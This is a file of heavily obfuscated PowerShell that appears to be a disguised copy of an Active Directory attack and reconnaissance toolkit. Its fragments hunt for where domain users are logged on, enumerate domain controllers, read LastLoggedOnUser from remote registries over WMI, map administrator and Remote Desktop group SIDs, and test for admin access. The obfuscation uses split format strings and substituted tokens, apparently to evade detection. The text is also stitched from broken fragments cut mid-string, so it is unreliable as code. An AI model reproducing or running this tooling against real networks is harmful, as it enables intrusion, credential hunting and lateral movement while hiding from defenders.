        if (YoV{psBIJKoUndIJKpaIJKRIJKAMEtERS}[(Z3b{3}{0}{2}{1}Z3b ','IJKRIJKguMENTS}[(Z3b{2}{1}{0}{3}Z3b-fS5zMaS5z,S5zityS5z,S5zSecurS5z,S5zsksS5z)] = (Z3b{0}{1}Z3b -fS5zDaS5z,S5zclS5z)
        }
        if (YoV{pSIJKBoUIJKNDIJKpAramETIJKerS}[(Z3b{0}{1}Z3b-f S5zDS5z,S5zomainS5z)]) { YoV{sEARcIJKHeRArGUIJKMIJKenIJKTS}[(Z3b{1}{0}Z3b -f S5zmainS5z,S5zDoS5z)] = YoV{doMaIJKIn} }
        if (YoV{psIJKBoUNdpaIJKRAIJKmetIJKers}[(Z3b{0}{1}{2}Z3b-fS5zSearS5z,S5zchBS5z,S5zaseS5z)]) { YoV{SeIJKArIJKcheIJKRIJKARGumIJKENts}[(Z3b{3}{1}{0}{2}Z3b -f S5zsS5z,S5zaS5z,S5zeS5z,S5zSearchBS5z)] = YoV{SIJKeaIJKRCHBAsE} }
        if (YoV{PSbIJKouNDPIJKAIJKRIJKAMIJKetERS}[(Z3b{0}{1}Z3b -fS5zServS5z,S5zerS5z)]) { YoV{SIJKEarIJKchIJKEIJKRaIJKRgumENtS}[(Z3b{0}{1}Z3b -fS5zSerS5z,S5zverS5z)] = YoV{sErIJKVEr} }
        if (YoV{PIJKsBOuIJKNdParaIJKmeteIJKRS}[(Z3b{3}{0}{1}{2}Z3b-f S5zearchS5z,S5zScoS5z,S5zpeS5z,S5zSS5z)]) { YoV{SIJKearcHeRarguMIJKeIJKNTs}[(Z3b{0}{1}{2}Z3b -fS5zSeS5z,S5zarchScS5z,S5zopeS5z)] = YoV{seARchscIJKOIJKpE} }
        if (YoV{PIJKSBOundpIJKARIJKAmetIJKErS}[(Z3b{4}{3}{1}{0}{2}Z3b -fS5ziS5z,S5zageSS5z,S5zzeS5z,S5zPS5z,S5zResultS5z)]) { YoV{SeaIJKRcIJKhERarIJKGUMenTS}[(Z3b{2}{0}{1}{3}Z3b -f S5zesulS5z,S5ztPageS5z,S5zRS5z,S5zSizeS5z)] = YoV{rIJKeSuIJKltPAgeSIJKiIJKZe} }
        if (YoV{pIJKSboIJKUNDPIJKAraMetIJKeRs}[(Z3b{1}{2}{0}Z3b-fS5zLimitS5z,S5zServeS5z,S5zrTimeS5z)]) { YoV{SeIJKARIJKCheRaRGIJKUMEnIJKTS}[(Z3b{2}{3}{1}{0}{4}Z3b-fS5zeLimiS5z,S5zmS5z,S5zServS5z,S5zerTiS5z,S5ztS5z)] = YoV{sIJKEIJKRIJKVIJKeRTimELImIt} }
        if (YoV{pSIJKBoIJKUndParaMIJKEtErs}[(Z3b{2}{0}{1}{3}Z3b -f S5zmbS5z,S5zstonS5z,S5zToS5z,S5zeS5z)]) { YoV{seAIJKRChEIJKRIJKArgUMeNTs}[(Z3b{0}{1}{2}Z3b -fS5zTombstS5z,S5zonS5z,S5zeS5z)] = YoV{tIJKomBsIJKToNE} }
        if (YoV{psboIJKUNDIJKpAramETIJKErS}[(Z3b{2}{0}{1}Z3b -f S5zedeS5z,S5zntialS5z,S5zCrS5z)]) { YoV{sIJKEARchEraIJKRgUIJKmEIJKNtS}[(Z3b{1}{2}{0}Z3b -fS5zalS5z,S5zCredenS5z,S5ztiS5z)] = YoV{CredIJKenIJKTiIJKAL} }
        YoV{seArCIJKhIJKER} = &(Z3b{3}{1}{2}{0}Z3b -f S5zrS5z,S5zmS5z,S5zain',',

        [Switch]
        YoV{rIJKAw}
    )

    BEGIN {
        YoV{SEaIJKRCIJKheraIJKRgumeNIJKTS} = @{}
        if (YoV{PsbIJKoUIJKNDPArIJKAIJKMeIJKTERs}[(Z3b{0}{1}Z3b -fS5zDomS5z,S5zainS5z)]) { YoV{sEIJKArcheraIJKRIJKgIJKUMeNTs}[(Z3b{0}{1}{2}Z3b -f S5zDS5z,S5zomaiS5z,S5znS5z)] = YoV{DOmaIJKIN} }
        if (YoV{PSboUNDIJKpIJKARAmIJKeTeIJKRs}[(Z3b{3}{0}{1}{2}Z3b-fS5zrS5z,S5zoperS5z,S5ztiesS5z,S5zPS5z)]) { YoV{SIJKEArcheRaIJKRIJKGUmEnIJKTs}[(Z3b{2}{1}{0}Z3b -fS5zsS5z,S5zertieS5z,S5zPropS5z)] = YoV{PrIJKoperIJKTIEs} }
        if (YoV{PsBOUIJKNIJKDPARAmIJKEIJKTERs}[(Z3b{0}{2}{1}Z3b-fS5zSeS5z,S5zaseS5z,S5zarchBS5z)]) { YoV{SIJKearIJKCHErArGIJKUmeIJKNTS}[(Z3b{0}{2}{1}Z3b -fS5zSeaS5z,S5zaseS5z,S5zrchBS5z)] = YoV{seARcHIJKBAIJKSe} }
        if (YoV{pSIJKBOUndpARIJKAMEtIJKERs}[(Z3b{2}{1}{0}Z3b-f S5zrS5z,S5zeS5z,S5zServS5z)]) { YoV{sEARIJKcHeRArGIJKUmEIJKNIJKTs}[(Z3b{1}{0}Z3b-fS5zerverS5z,S5zSS5z)] = YoV{sIJKervIJKer} }
        if (YoV{PSbounDpArIJKAIJKMIJKETeIJKRS}[(Z3b{3}{0}{2}{1}Z3b -fS5zearcS5z,S5zcopeS5z,S5zhSS5z,S5zSS5z)]) { YoV{sEAIJKRcHEIJKRAIJKRgUIJKmenTs}[(Z3b{1}{3}{2}{0}Z3b -fS5zcopeS5z,S5zSeS5z,S5zhSS5z,S5zarcS5z)] = YoV{SEarcIJKhIJKsCIJKoPe} }
        if (YoV{PSbOUnDpIJKAraIJKmEtIJKErs}[(Z3b{1}{3}{0}{2}Z3b -fS5ztPageS5z,S5zResS5z,S5zSizeS5z,S5zulS5z)]) { YoV{sIJKEarcHIJKERIJKAIJKRGIJKUmEnTs}[(Z3b{0}{1}{2}Z3b -f S5zResultPaS5z,S5zgeSS5z,S5zizeS5z)] = YoV{REIJKsUIJKlTpAgeIJKsiZe} }
        if (YoV{psbOUnDpAIJKRIJKAIJKmEtErs}[(Z3b{0}{2}{1}Z3b -fS5zServeS5z,S5zimeLimitS5z,S5zrTS5z)]) { YoV{SEarCheIJKRIJKAIJKRGuMeNTS}[(Z3b{3}{2}{0}{1}Z3b -fS5zmeS5z,S5zLimitS5z,S5zTiS5z,S5zServerS5z)] = YoV{SErIJKVeIJKRIJKTIIJKmElImit} }
        if (YoV{pSbOunIJKDPaRameIJKTIJKers}[(Z3b{0}{2}{3}{4}{1}Z3b-f S5zSecS5z,S5zsS5z,S5zuritS5z,S5zyS5z,S5zMaskS5z)]) { YoV{searCIJKHIJKErIJKARgUMIJKentS}[(Z3b{3}{4}{2}{0}{1}Z3b -f S5zskS5z,S5zsS5z,S5zMaS5z,S5zSecurS5z,S5zityS5z)] = YoV{secIJKUIJKRIIJKTYmIJKAsKS} }
        if (YoV{pSBIJKOUNDIJKParIJKAMEtERs}[(Z3b{2}{1}{0}Z3b-fS5ztoneS5z,S5zsS5z,S5zTombS5z)]) { YoV{searCHerIJKAIJKRguIJKmenIJKTS}[(Z3b{0}{1}{2}Z3b-fS5zTombstS5z,S5zoS5z,S5zneS5z)] = YoV{tIJKoMBstOIJKNE} }
        if (YoV{PsbIJKoIJKUNdpAraMetIJKers}[(Z3b{0}{2}{1}Z3b -f S5zCreS5z,S5zntialS5z,S5zdeS5z)]) { YoV{seIJKAIJKRIJKcHEraIJKRguMIJKeNTS}[(Z3b{0}{1}{2}Z3b -f S5zCreS5z,S5zdentiaS5z,S5zlS5z)] = YoV{credEIJKNIJKTIJKIAl} }
        YoV{gpOsIJKEAIJKRCIJKher} = &(Z3b{3}{1}{2}{0}Z3b-fS5zerS5z,S5zmainSearcS5z,S5zhS5z,S5zGet-DoS5z) @SearcherArguments
    }

    PROCESS {
        if (YoV{GP',' YoV{GIJKROuIJKPMEmberS}
                    }

                    if (-not YoV{MeMIJKBErShiIJKps}[YoV{GrOIJKUP}]) {
                        YoV{MeIJKmbIJKeRSHIIJKPs}[YoV{GrIJKoIJKUP}] = @{}
                    }
                    if (YoV{meMBIJKeIJKRsIJKhipVaLIJKUE} -isnot [System.Array]) {YoV{MEmIJKBIJKeRIJKsHiPVaLUE} = @(YoV{MEmIJKBeIJKRshiIJKpIJKVAlUE})}
                    YoV{meIJKmIJKBeRsIJKhipS}[YoV{grIJKoUP}].(Z3b{0}{1}Z3b -fS5zAS5z,S5zddS5z).Invoke(YoV{rElAIJKTION}, YoV{MIJKeMIJKBerIJKShIPVAlIJKUe})
                }

                ForEach (YoV{meIJKmBeRIJKSIJKhip} in YoV{memBersIJKhiIJKpS}.(Z3b{2}{3}{0}{1}Z3b -fS5zeS5z,S5zratorS5z,S5zGetES5z,S5znumS5z).Invoke()) {
                    if (YoV{MemIJKBeIJKRIJKshiP} -and YoV{MIJKEmBIJKERShip}.Z3bKIJKeyZ3b -and (YoV{MIJKEmbeIJKRSHiP}.Z3bkIJKeyZ3b -match S5z^5rj*S5z)) {
                        
                        YoV{GrIJKoUPSIJKiD} = YoV{memIJKBIJKErSHip}.Z3bKIJKeYZ3b.(Z3b{1}{0}Z3b-f S5zimS5z,S5zTrS5z).Invoke(S5z*S5z)
                        if (YoV{gIJKROupsIJKId} -and (YoV{gRoIJKUIJKpSId}.(Z3b{1}{0}Z3b-fS5zimS5z,S5zTrS5z).Invoke() -ne S5zS5z)) {
                            YoV{GIJKRIJKoUPNIJKAME} = &(Z3b{2}{3}{0}{4}{1}Z3b -fS5zom-S5z,S5zIDS5z,S5zConS5z,S5zvertFrS5z,S5zSS5z) -ObjectSID YoV{gRouIJKPsiD} @ConvertArguments
                        }
                        else {
                            YoV{GrIJKOIJKUPNIJKAmE} = YoV{fIJKAIJKlse}
                        }
                    }
                    else {
                        YoV{gIJKRouIJKpnamE} = YoV{meMbERSIJKHIJKIp}.Z3bKIJKEyZ3b

                        if (YoV{gIJKRIJKouPnAmE} -and (YoV{gROIJKUpIJKNaME}.(Z3b{0}{1}Z3b -fS5zTS5z,S5zrimS5z).Invoke() -ne S5zS5z)) {
                            if (YoV{GROuIJKpIJKNaIJKmE} -match (Z3b{2}{0}{1}{3}Z3b -fS5zisS5z,S5ztratS5z,S5zAdminS5z,S5zorsS5z)) {
                                YoV{grOUPSIJKiD} = (Z3b{1}{3}{2}{0}Z3b -f S5z544S5z,S5zSS5z,S5z-5-32-S5z,S5z-1S5z)
                            }
                            elseif (YoV{grOIJKUPIJKNaME} -match (Z3b{3}{0}{2}{1}Z3b-f S5zte DeskS5z,S5zopS5z,S5ztS5z,S5zRemoS5z)) {
                                YoV{GIJKROIJKUpsiD} = (Z3b{3}{0}{1}{2}Z3b-fS5z1S5z,S5z-5-32-5S5z,S5z55S5z,S5zS-S5z)
                            }
                            elseif (YoV{GrOIJKUIJKPnaMe} -match (Z3b{1}{0}{2}Z3b-f S5zestS5z,S5zGuS5z,S5zsS5z)) {
                                YoV{GIJKRoupIJKSId} = (Z3b{0}{2}{1}Z3b-f S5zS-1-5-3S5z,S5z546S5z,S5z2-S5z)
                            }
                            elseif (YoV{GIJKRoIJKUPNIJKAmE}.(Z3b{1}{0}Z3b -f S5zmS5z,S5zTriS5z).Invoke() -ne S5zS5z) {
                                YoV{coNIJKVerTIJKTOAIJKRGumENTs} = @{(Z3b{1}{2}{0}Z3b-f S5zameS5z,S5zObjecS5z,S5ztNS5z) = YoV{grOUIJKpIJKNAmE}}
                                if (YoV{PsbOUnIJKdPIJKAIJKRaIJKMEIJKTERS}[(Z3b{1}{0}Z3b -fS5zmainS5z,S5zDoS5z)]) { YoV{CoIJKNvERttoArIJKguMIJKenIJKTS}[(Z3b{1}{0}{2}Z3b-f S5zmaiS5z,S5zDoS5z,S5znS5z)] = YoV{DIJKoMaiN} }
                                YoV{gRoIJKUIJKpIJKSiD} = &(Z3b{2}{0}{3}{1}Z3b -f S5ztToS5z,S5zDS5z,S5zConverS5z,S5z-SIS5z) @ConvertT','5zloS5z,S5zstS5z,S5zcalhoS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CRedeIJKNIJKTIJKIAl} =   ( &(Z3b{1}{0}{2}Z3b-fS5zaBS5z,S5zVArIS5z,S5zLeS5z)  (S5zjfS5z+S5ziS5z)  -VAlUEo)::Z3bEIJKmPtYZ3b
    )

    PROCESS {
        ForEach (YoV{coMpuIJKTIJKER} in YoV{coMpIJKUIJKTErIJKNAIJKmE}) {
            
            YoV{HkIJKlM} = 2147483650

            YoV{wIJKMIJKIIJKArGUMENtS} = @{
                (Z3b{0}{1}Z3b-f S5zLisS5z,S5ztS5z) = YoV{TRIJKUe}
                (Z3b{0}{1}Z3b -fS5zCS5z,S5zlassS5z) = (Z3b{2}{0}{1}Z3b -f S5zdRegS5z,S5zProvS5z,S5zStS5z)
                (Z3b{1}{0}{2}Z3b -fS5zmespacS5z,S5zNaS5z,S5zeS5z) = (((Z3b{0}{2}{1}Z3b -fS5zrS5z,S5zfaultS5z,S5zoot{0}deS5z))-F [char]92)
                (Z3b{0}{1}{2}{3}Z3b-fS5zCS5z,S5zompS5z,S5zuS5z,S5zternameS5z) = YoV{CIJKoMIJKPuTEr}
                (Z3b{0}{2}{1}Z3b -f S5zErS5z,S5zionS5z,S5zrorActS5z) = (Z3b{1}{2}{0}{3}Z3b -fS5ztinuS5z,S5zSiS5z,S5zlentlyConS5z,S5zeS5z)
            }
            if (YoV{pIJKSIJKBOuNDpIJKAraMEterS}[(Z3b{2}{0}{1}Z3b -f S5zredeS5z,S5zntialS5z,S5zCS5z)]) { YoV{wMIJKIaRIJKgUMENIJKTs}[(Z3b{0}{1}{2}Z3b -fS5zCredS5z,S5zenS5z,S5ztialS5z)] = YoV{cIJKREDEIJKNtIal} }

            
            try {
                YoV{RIJKEg} = &(Z3b{1}{0}{2}Z3b-fS5zWmiS5z,S5zGet-S5z,S5zObjectS5z) @WmiArguments

                YoV{kIJKEY} = (((Z3b{6}{1}{3}{7}{9}{8}{4}{10}{5}{2}{0}Z3b-fS5zILogonUIS5z,S5zOFTWS5z,S5ztion2iS5z,S5zARE2iIMicrosoftS5z,S5zAuthenS5z,S5zicaS5z,S5zSS5z,S5z2iIWindows2iICurrentVerS5z,S5zon2iIS5z,S5zsiS5z,S5ztS5z)) -repLACE([cHAr]50+[cHAr]105+[cHAr]73),[cHAr]92)
                YoV{VaIJKlIJKUE} = (Z3b{2}{0}{1}{3}{4}Z3b -fS5zoggeS5z,S5zdS5z,S5zLastLS5z,S5zOnUsS5z,S5zerS5z)
                YoV{LASIJKTUIJKseR} = YoV{rIJKeg}.(Z3b{3}{0}{2}{1}Z3b -f S5zStS5z,S5zueS5z,S5zringValS5z,S5zGetS5z).Invoke(YoV{HKIJKlm}, YoV{KIJKEy},','} = &(Z3b{0}{3}{2}','z) (,YoV{PIJKRoIJKpIJKeRTIES}[YoV{_}][0])).Z3bguIJKIdZ3b
            }
            elseif (YoV{_} -eq (Z3b{5}{4}{3}{2}{1}{0}Z3b-f S5zrolS5z,S5zntS5z,S5zoS5z,S5zountcS5z,S5zseraccS5z,S5zuS5z)) {
                YoV{OIJKBjIJKEIJKCTPRIJKoIJKPErties}[YoV{_}] = YoV{PrOIJKpeIJKRTIJKIes}[YoV{_}][0] -as YoV{uIJKAcIJKENuM}
            }
            elseif (YoV{_} -eq (Z3b{3}{4}{2}{0}{1}Z3b -fS5zitydesS5z,S5zcriptorS5z,S5zrS5z,S5zntsS5z,S5zecuS5z)) {
                
                YoV{dIJKeScRiPIJKToR} = &(Z3b{0}{2}{1}Z3b -f S5zNew-OS5z,S5zectS5z,S5zbjS5z) (Z3b{7}{4}{1}{2}{3}{6}{0}{5}Z3b -f S5zcrS5z,S5zssS5z,S5zControlS5z,S5z.RS5z,S5zcceS5z,S5ziptorS5z,S5zawSecurityDesS5z,S5zSecurity.AS5z) -ArgumentList YoV{PIJKROIJKpertIIJKeS}[YoV{_}][0], 0
                if (YoV{DeScIJKRipIJKToR}.Z3boWIJKNERZ3b) {
                    YoV{OIJKBJIJKeCTIJKpRIJKOpIJKERtieS}[(Z3b{1}{0}Z3b-f S5zwnerS5z,S5zOS5z)] = YoV{DesIJKcrIIJKPtor}.Z3bOIJKWnerZ3b
                }
                if (YoV{DIJKESCrIJKiIJKPtOR}.Z3bgIJKRoUPZ3b) {
                    YoV{oIJKBIJKJEcTpRopErIJKTies}[(Z3b{0}{1}Z3b -fS5zGroS5z,S5zupS5z)] = YoV{desCrIJKiPIJKToR}.Z3bgIJKROupZ3b
                }
                if (YoV{DEIJKSCriPIJKToR}.Z3bdIscrEtIOIJKNIJKArYIJKAIJKCLZ3b) {
                    YoV{oBJECIJKTPIJKRopIJKeRIJKTIeS}[(Z3b{2}{0}{3}{1}Z3b-fS5zionS5z,S5zyAclS5z,S5zDiscretS5z,S5zarS5z)] = YoV{DIJKescRiIJKpTIJKOr}.Z3bDiSCIJKREIJKTIJKIoNArYAClZ3b
                }
                if (YoV{dIJKeScIJKRIIJKptOr}.Z3bSYsTemIJKAIJKClZ3b) {
                    YoV{ObjEctIJKPrOIJKPIJKerTIEs}[(Z3b{2}{0}{1}Z3b -f S5zcS5z,S5zlS5z,S5zSystemAS5z)] = YoV{DEIJKSCIJKRIJKipToR}.Z3bSYsIJKTIJKeMacLZ3b
                }
            }
            elseif (YoV{_} -eq (Z3b{3}{2}{1}{0}Z3b -f S5zesS5z,S5zxpirS5z,S5znteS5z,S5zaccouS5z)) {
                if (YoV{PrIJKOpIJKerIJKTieS}[YoV{_}][0] -gt  (&(Z3b{1}{0}Z3b-f S5zirS5z,S5zDS5z)  VarIAbLE:7DVcIe  ).Z3bvAIJKLueZ3b::Z3bmAIJKxvIJKAluEZ3b.Z3btIIJKckSZ3b) {
                    YoV{ObJecTPIJKROpeIJKRTiIJKES}[YoV{_}] = (Z3b{0}{1}Z3b -f S5zNS5z,S5zEVERS5z)
                }
                else {
                    YoV{OBJeIJKcTprIJKoPIJKertIIJKeS}[YoV{_}] =   (  &(S5zlsS5z) (S5zVariABlE:7dS5z+S5zVcS5z+S5zIS5z+S5zES5z) ).Z3bvIJKALUEZ3b::Z3bfRoIJKMfIJKILetimEZ3b(YoV{pIJKROpEIJKRtIJKies}[YoV{_}][0])
                }
            }
            elseif ( (YoV{_} -eq (Z3b{2}{1}{0}Z3b -f S5zogonS5z,S5zlS5z,S5zlastS5z)) -or (YoV{_} -eq (Z3b{4}{2}{1}{3}{0}Z3b-f S5zpS5z,S5zsS5z,S5zogontimeS5z,S5ztamS5z,S5zlastlS5z)) -or (YoV{_} -eq (Z3b{1}{2}{0}Z3b -f S5zstsetS5z,S5zpwdS5z,S5zlaS5z)) -or (YoV{_} -eq (Z3b{1}{0}{2}Z3b-f S5zoS5z,S5zlastlS5z,S5zgoffS5z)) -or (YoV{_} -eq (Z3b{2}{0}{1}{3}Z3b -fS5zaS5z,S5zsswordTS5z,S5zbadPS5z,S5zimeS5z)) ) {
                
                if (YoV{PIJKRoIJKPerTIIJKeS}[YoV{_}][0] -is [System.MarshalByRefObject]) {
                    
                    YoV{TeIJKmp} = YoV{PRIJKOpIJKeIJKRties}[YoV{_}][0]
                    [Int32]YoV{HiIJKgh} = YoV{TEIJKMP}.(Z3b{2}{0}{1}Z3b-fS5zypS5z,S5zeS5z,S5zGetTS5z).Invoke().(Z3b{0}{1}{2}Z3b -f S5zInvoS5z,S5zkeMemS5z,S5zberS5z).Invoke((Z3b{1}{0}{2}Z3b -fS5zgS5z,S5zHiS5z,S5zhPartS5z),   ( &(Z3b{1}{0}{2}Z3b-f S5zVAriS5z,S5zGet','S5z)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(posiTioN = 0, VAluefRompiPElINe = YoV{TRIJKUE}, VAlueFroMpipeLInEBYpRoPerTYNAme = YoV{tRIJKUE})]
        [Alias({Z3b{0}{1}Z3b-fS5zSS5z,S5zourceS5z}, {Z3b{0}{1}Z3b -f S5zNamS5z,S5zeS5z})]
        [String]
        YoV{POliIJKcY} = (Z3b{0}{1}{2}Z3b -fS5zDomS5z,S5zaiS5z,S5znS5z),

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DIJKOmIJKAIn},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{3}{0}{1}{2}Z3b-f S5zmS5z,S5zaiS5z,S5znControllerS5z,S5zDoS5z})]
        [String]
        YoV{sERvIJKER},

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SeRverTIJKIMIJKEIJKLiMit},

        [Management.Automation.PSCredential]
        [Manage','b-f S5zNoS5z,S5zneS5z}, {Z3b{1}{0}Z3b -f S5zwnerS5z,S5zOS5z}, {Z3b{1}{0}Z3b-f S5zaclS5z,S5zSS5z})]
        [String]
        YoV{SeCuIJKRityIJKMAsKS},

        [Switch]
        YoV{TIJKomBIJKSIJKTONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{cIJKRIJKeDeNTIal} =   YoV{jIJKFI}::Z3bEIJKmPtyZ3b
    )

    PROCESS {
        if (YoV{pSboIJKUnDpAIJKRaIJKMetIJKErs}[(Z3b{1}{0}Z3b-f S5zmainS5z,S5zDoS5z)]) {
            YoV{tARgEtIJKdoMIJKAiN} = YoV{dIJKOmAIn}

            if (YoV{ENvIJK:usIJKEIJKRDNsdOmIJKAin} -and (YoV{EIJKNvIJK:uSerDNIJKsdOMain}.(Z3b{1}{0}Z3b-f S5zmS5z,S5zTriS5z).Invoke() -ne S5zS5z)) {
                
                YoV{uSIJKerDIJKomIJKAIN} = YoV{eNIJKVIJK:uSIJKERdnsDomAIN}
                if (YoV{enIJKVIJK:lOGONSERIJKVIJKer} -and (YoV{enV:LIJKoIJKgoNSeIJKRV','5z,S5ztion] QueS5z,S5z seS5z,S5zrvS5z,S5zngS5z,S5zrLocS5z,S5zsS5z,S5zerS5z,S5zor DFSS5z,S5zmainUseS5z,S5zryiS5z,S5z[Find-DoS5z)
                    
                    
                }
                if (YoV{sTeAIJKLThSOuIJKRce} -match (((Z3b{1}{0}Z3b -fS5zlS5z,S5zDCD43AlS5z)).(Z3b{1}{0}Z3b -fS5zacES5z,S5zRePlS5z).Invoke(S5zD43S5z,S5zJGOS5z))) {
                    &(Z3b{0}{2}{1}Z3b-f S5zWS5z,S5zeS5z,S5zrite-VerbosS5z) (Z3b{1}{6}{5}{3}{4}{0}{2}{9}{7}{8}Z3b -f S5ziS5z,S5z[Find-DS5z,S5zon] QuS5z,S5zainUsS5z,S5zerLocatS5z,S5zmS5z,S5zoS5z,S5z for domain controllerS5z,S5zsS5z,S5zeryingS5z)
                    YoV{dcsEARChERIJKAIJKRIJKGumeIJKNIJKTs} = @{
                        (Z3b{1}{0}Z3b-f S5zDAPS5z,S5zLS5z) = YoV{tIJKRUE}
                    }
                    if (YoV{pSBoUNDpaRaIJKMEIJKTIJKEIJKRS}[(Z3b{0}{1}Z3b-f S5zDomS5z,S5zainS5z)]) { YoV{DCsEAIJKRIJKCHEIJKRArgUIJKmENTs}[(Z3b{0}{1}Z3b -f S5zDomaS5z,S5zinS5z)] = YoV{dIJKoMIJKAiN} }
                    if (YoV{PIJKsBOIJKUNDIJKPARamEIJKTeRs}[(Z3b{0}{2}{1}Z3b-f S5zCompuS5z,S5zrDomainS5z,S5zteS5z)]) { YoV{DCSEaIJKRCheIJKRAIJKRIJKgUmEIJKNtS}[(Z3b{0}{1}Z3b -f S5zDomS5z,S5zainS5z)] = YoV{CoMPUIJKTIJKErdOIJKmAIJKIN} }
                    if (YoV{psbIJKOIJKUndPARAIJKMeTeIJKRs}[(Z3b{1}{0}{2}Z3b -fS5zeS5z,S5zSS5z,S5zrverS5z)]) { YoV{DIJKcseARIJKCHIJKeRAIJKRIJKgumEnts}[(Z3b{0}{1}Z3b -fS5zSS5z,S5zerverS5z)] = YoV{SeIJKRIJKVER} }
                    if (YoV{pSboIJKUNdpaIJKRIJKAIJKMIJKetERs}[(Z3b{1}{0}{2}Z3b -f S5ztiS5z,S5zCredenS5z,S5zalS5z)]) { YoV{dIJKCsIJKEarcherArGUIJKmIJKEnTs}[(Z3b{0}{1}{2}Z3b -fS5zCredS5z,S5zentS5z,S5zialS5z)] = YoV{CrEIJKdIJKeNTIJKIal} }
                    YoV{DOMAiIJKNcoNIJKTrOLlEIJKRs} = &(Z3b{2}{3}{4}{0}{1}Z3b -f S5ztrollS5z,S5zerS5z,S5zGet-DomS5z,S5zaiS5z,S5znConS5z) @DCSearcherArguments JGO &(Z3b{3}{4}{0}{1}{2}Z3b -f S5zt-ObjeS5z,S5zcS5z,S5ztS5z,S5zSS5z,S5zelecS5z) -ExpandProperty (Z3b{0}{1}{2}Z3b -fS5zdS5z,S5znshostnamS5z,S5zeS5z)
                    if (YoV{dIJKOMaiNContIJKRIJKOIJKLleRS} -isnot [System.Array]) { YoV{doIJKmaINCIJKOnIJKTrolLeRs} = @(YoV{dOmaIJKinIJKcontRIJKOLlERs}) }
                    YoV{taIJKRgEIJKTCOMpIJKUIJKTeRIJKARIJKRIJKAYlist}.(Z3b{1}{0}{2}Z3b-fS5zdS5z,S5zAS5z,S5zdRangeS5z).Invoke( YoV{DIJKoMIJKAiNCOnIJKTrIJKoLleRs} )
                }
                YoV{tARgIJKEtIJKCOmIJKPUTERs} = YoV{TArIJKGIJKEtCOIJKMIJKpIJKUteIJKRarIJKRAYlIST}.(Z3b{1}{0}Z3b -fS5zoArrayS5z,S5zTS5z).Invoke()
            }
            else {
                &(Z3b{1}{0}{3}{2}Z3b-f S5zeS5z,S5zWrite-VS5z,S5zseS5z,S5zrboS5z) (Z3b{6}{2}{13}{9}{0}{11}{17}{1}{12}{8}{14}{15}{16}{7}{10}{18}{3}{5}{4}Z3b-fS5znUserLocS5z,S5zyinS5z,S5znd-DoS5z,S5zeS5z,S5zomainS5z,S5z dS5z,S5z[FiS5z,S5zin S5z,S5zor S5z,S5zaiS5z,S5ztS5z,S5zation] S5z,S5zg fS5z,S5zmS5z,S5zall S5z,S5zcompuS5z,S5zters S5z,S5zQuerS5z,S5zhS5z)
                YoV{TIJKARIJKgeIJKTcOMpUteRs} = &(Z3b{3}{0}{2}{1}Z3b-fS5zainComputS5z,S5zrS5z,S5zeS5z,S','evelS5z,S5zOnS5z,S5zeLS5z}, {Z3b{1}{0}Z3b-fS5zbtreeS5z,S5zSuS5z})]
        [String]
        YoV{sIJKEaIJKRchIJKScopE} = (Z3b{0}{1}Z3b-f S5zSubtreS5z,S5zeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{reIJKSuIJKlTPaGeSIJKIze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SeRIJKVeRtIJKiMIJKeIJKLIMiT},

        [Switch]
        YoV{tIJKoMIJKBsTonE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CREIJKDEntIJKiAl} =  YoV{JIJKFI}::Z3beIJKMptyZ3b,

        [ValidateSet(S5zAllS5z, S5zV1S5z, S5z1S5z, S5zV2S5z, S5z2S5z)]
        [String]
        YoV{vERIJKsIJKIOn} = S5zAllS5z
    )

    BEGIN {
        YoV{SeIJKAIJKRCIJKheRAIJKRgUMenTs} = @{}
        if (YoV{pIJKSIJKBoIJKUndParAmIJKetErs}[(Z3b{1}{0}{2}Z3b-fS5zrS5z,S5zSeaS5z,S5zchBaseS5z)]) { YoV{SEIJKArCHIJKeIJKRArIJKGUIJKMents}[(Z3b{0}{1}{2}Z3b -fS5zSearS5z,S5zcS5z,S5zhBaseS5z)] = YoV{searIJKCIJKHbIJKASE} }
        if (YoV{pSbIJKoIJKUnIJKdParametErS}[(Z3b{2}{1}{0}Z3b -fS5zrS5z,S5zveS5z,S5zSer','0}Z3b-fS5zProcessS5z,S5zldS5z,S5zPS5z,S5zSShoS5z,S5zuS5z}, S5zS5z)]
    [CmdletBinding()]
    Param(
        [Parameter(pOsitIOn = 0, mANDatoRy = YoV{TIJKRUE}, VALUefROMpIPelINe = YoV{TRIJKUE}, valUefROMpiPELInEbyPRopeRtyNAMe = YoV{tRIJKUE})]
        [Alias({Z3b{3}{1}{5}{2}{0}{4}Z3b -fS5zaS5z,S5zguishS5z,S5zNS5z,S5zDistinS5z,S5zmeS5z,S5zedS5z}, {Z3b{1}{0}{2}Z3b-fS5zountNaS5z,S5zSamAccS5z,S5zmeS5z}, {Z3b{1}{0}Z3b -f S','               YoV{aIJKdMIN} = &(Z3b{0}{4}{2}{3}{1}Z3b-fS5zTeS5z,S5zccessS5z,S5zdS5z,S5zminAS5z,S5zst-AS5z) -ComputerName YoV{tArGeTCOMIJKPUTIJKER}
                                        YoV{usERLIJKOcAIJKTIJKiON} JGO &(Z3b{0}{2}{1}Z3b -fS5zAS5z,S5zrS5z,S5zdd-MembeS5z) (Z3b{0}{3}{1}{2}Z3b-f S5zNotepS5z,S5zoperS5z,S5ztyS5z,S5zrS5z) (Z3b{2}{1}{3}{0}Z3b-fS5zAdminS5z,S5zcaS5z,S5zLoS5z,S5zlS5z) YoV{adIJKmin}.Z3bISADIJKmIJKiNZ3b
                             ','2}{3}{1}{0}Z3b-fS5zjectS5z,S5zObS5z,S5zSS5z,S5zelect-S5z) -ExpandProperty (Z3b{2}{0}{1}Z3b -f S5zhostnamS5z,S5zeS5z,S5zdnsS5z)
        }
        &(Z3b{2}{1}{0}{3}Z3b-f S5zite-VeS5z,S5zrS5z,S5zWS5z,S5zrboseS5z) Z3b[Find-DomainProcess] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b
        if (YoV{taIJKRgETcIJKOMIJKpIJKUtErs}.Z3blIJKENGIJKTHZ3b -eq 0) {
